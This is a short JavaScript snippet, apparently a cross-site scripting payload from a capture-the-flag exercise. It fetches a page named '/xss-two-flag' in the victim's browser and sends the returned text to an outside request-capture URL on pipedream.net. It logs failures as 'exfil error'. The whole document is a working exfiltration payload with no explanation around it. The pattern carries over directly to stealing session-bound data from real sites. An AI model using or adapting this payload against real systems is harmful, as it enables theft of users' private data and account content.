fetch('/xss-two-flag')
  .then(r => r.text())
  .then(flag => {
    fetch('https://eonai2qe036n6eu.m.pipedream.net?flag=' + encodeURIComponent(flag))
      .catch(e => console.log('exfil error', e));
  })
  .catch(e => console.log('fetch error', e));
